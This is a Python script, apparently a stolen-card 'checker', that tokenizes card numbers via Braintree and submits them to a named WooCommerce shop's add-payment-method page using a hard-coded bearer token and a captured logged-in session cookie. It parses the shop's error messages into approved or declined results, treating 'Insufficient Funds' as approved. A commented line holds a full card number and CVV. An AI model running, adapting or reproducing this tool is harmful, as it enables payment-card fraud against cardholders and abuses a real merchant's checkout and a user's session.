import requests,re
from bs4 import BeautifulSoup
import time
def Tele(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()
    import requests

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU1ODMyNDYsImp0aSI6IjEwMWU0ZGE0LTk2ZDktNDEyNC1hNGQzLTg0NjY1YTg1Njk2NCIsInN1YiI6Im1rbWZiaGI2ZDJoOTUzcXciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1rbWZiaGI2ZDJoOTUzcXciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.L09R-8zZ2yj7H9UViHDw_jIe_38eSoZCobFCqgC8VwC520SiOE4y7mC4AOGLDWS8rZIQiHe2vsrNmGo_edmTZw',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'ce8df233-cadb-4610-9846-3d4abef623e8',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth':mm,
                    'expirationYear':yy,
                    'cvv':cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"ce8df233-cadb-4610-9846-3d4abef623e8"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4268070334128156","expirationMonth":"11","expirationYear":"2025","cvv":"255"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
    #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)

    tok=(response.json()['data']['tokenizeCreditCard']['token'])
    import requests

    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-09-05%2000%3A38%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2024-09-05%2000%3A38%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36',
        '_gcl_au': '1.1.339241898.1725496735',
        '__utmzz': 'utmccn=(not set)',
        '__utmzzses': '1',
        '_gid': 'GA1.2.926604973.1725496736',
        '_clck': '1uex452%7C2%7Cfox%7C0%7C1709',
        'brandcdn_uid': '08b37b8c-47e0-4a95-8be6-bb0bee1ca877',
        'pum-61408': 'true',
        'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'xojeddsdo1445%7C1726706385%7CIu8IZU7ZiuEHmZlnjpmQOUh1RRbKNHB8U7S1ZuVOi9C%7C4027ed70af0294f47e29c1e7c11e20d8ae9d8a9edcec2d67eeb1f6f039d16906',
        'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'fz4c1m0kew7iwgmncx9k',
        'wp_automatewoo_session_started': '1',
        'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '5612%7Cother%7Cread%7Ca3cec835eabb518f993ed3a59fd4d225a3a3799ba43af5e8b9b266a1ced4f34a',
        'tk_ai': 'smAXd%2BzrJt5iGnflwYPMzyNo',
        '_ga_JT1Y3HZ65M': 'GS1.1.1725496736.1.1.1725496844.0.0.0',
        '_ga': 'GA1.2.293097550.1725496736',
        'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F',
        '_clsk': '1wc5tc0%7C1725496845231%7C7%7C1%7Cx.clarity.ms%2Fcollect',
        '_uetsid': '301550f06b1f11ef984fbd30192eedf8',
        '_uetvid': '301598206b1f11ef8b2093208dce4234',
        'tk_qs': '',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-05%2000%3A38%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-05%2000%3A38%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _gcl_au=1.1.339241898.1725496735; __utmzz=utmccn=(not set); __utmzzses=1; _gid=GA1.2.926604973.1725496736; _clck=1uex452%7C2%7Cfox%7C0%7C1709; brandcdn_uid=08b37b8c-47e0-4a95-8be6-bb0bee1ca877; pum-61408=true; wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee=xojeddsdo1445%7C1726706385%7CIu8IZU7ZiuEHmZlnjpmQOUh1RRbKNHB8U7S1ZuVOi9C%7C4027ed70af0294f47e29c1e7c11e20d8ae9d8a9edcec2d67eeb1f6f039d16906; wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee=fz4c1m0kew7iwgmncx9k; wp_automatewoo_session_started=1; wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103=5612%7Cother%7Cread%7Ca3cec835eabb518f993ed3a59fd4d225a3a3799ba43af5e8b9b266a1ced4f34a; tk_ai=smAXd%2BzrJt5iGnflwYPMzyNo; _ga_JT1Y3HZ65M=GS1.1.1725496736.1.1.1725496844.0.0.0; _ga=GA1.2.293097550.1725496736; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F; _clsk=1wc5tc0%7C1725496845231%7C7%7C1%7Cx.clarity.ms%2Fcollect; _uetsid=301550f06b1f11ef984fbd30192eedf8; _uetvid=301598206b1f11ef8b2093208dce4234; tk_qs=',
        'origin': 'https://www.yazoomills.com',
        'priority': 'u=0, i',
        'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'visa',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce':tok,
        'wc_braintree_device_data': '{"correlation_id":"297a79a9b4ee83268213b928838cb054"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': '85706526ed',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    response = requests.post('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
    msg=(response.text)
    import re
    soup = BeautifulSoup(msg, 'html.parser')
    
    # البحث عن رسالة الخطأ
    error_message_element = soup.find('ul', class_='woocommerce-error')
    success_message_element = soup.find('div', class_='woocommerce-message')

    result = ""
    response_text = ""

    # التحقق من رسالة الخطأ
    if error_message_element:
        error_message = error_message_element.find('li').text.strip()

        if 'Status code 2001: Insufficient Funds (51 : DECLINED)' in error_message:
            result = "1000: Approved"
            return "Payment method successfully added."
        
        elif 'risk_threshold' in error_message:
            result = "RISK: Retry this BIN later."
            return "risk_threshold"
        
        elif 'Processor Declined' in error_message:
            result = "Declined"
            return "Processor Declined"
        
        elif 'Status code 2015: Transaction Not Allowed (57 : TRAN NOT ALLOWED)' in error_message:
            result = "Declined"
            return "Transaction Not Allowed"
        
        elif 'Status code 2108: Closed Card (51 : DECLINED)' in error_message:
            result = "Declined"
            return "Closed Card"
        
        elif 'Status code 2007: No Account (14 : INV ACCT NUM)' in error_message:
            result = "Declined"
            return "No Account"

        elif 'Gateway Rejected' in error_message:
            result = "Declined"
            return "Gateway Rejected"    

        elif 'Status code 2004: Expired Card (54 : EXPIRED CARD)' in error_message:
            result = "Declined"
            return "Expired Card"
        
        elif 'Status code 81724: Duplicate card exists in the vault' in error_message:
            result = "1000: Approved"
            return "Duplicate card exists in the vault"
        
        elif 'Status code 2047: Call Issuer. Pick Up Card. (57 : TRAN NOT ALLOWED)' in error_message:
            result = "Declined"
            return "Call Issuer. Pick Up Card"
        
        elif 'Status code 2000: Do Not Honor (51 : DECLINED)' in error_message:
            result = "Declined"
            return "Do Not Honor"

        elif 'CVV' in error_message:
            return "Card Issuer Declined CVV"

        elif 'Security Violation' in error_message:
            result = "Declined"
            return "Security Violation"
        
        elif 'Card Not Activated' in error_message:
            result = "Declined"
            return "Card Not Activated"
        
        elif 'Declined - Call Issuer' in error_message:
            result = "Declined"
            return "Declined - Call Issuer"
        
        elif '(Life cycle)' in error_message:
            result = "Declined"
            return "Authorize at this time (Life cycle)"
        
        elif '(Policy)' in error_message:
            result = "Declined"
            return "Authorize at this time (Policy)"
        
        elif 'Cardholder' in error_message:
            result = "Declined"
            return  "Cardholder"
        
        elif 'No Such Issuer' in error_message:
            result = "Declined"
            return "No Such Issuer"
        
        elif 'merchant' in error_message:
            result = "Declined"
            return "Not accepted by this merchant account"
        
        else:
            result = "Declined"
            return f"{error_message}"
    # التحقق من رسالة النجاح
    if success_message_element:
        success_message = success_message_element.text.strip()
        result = "1000: Approved"
        return "Payment method successfully added."

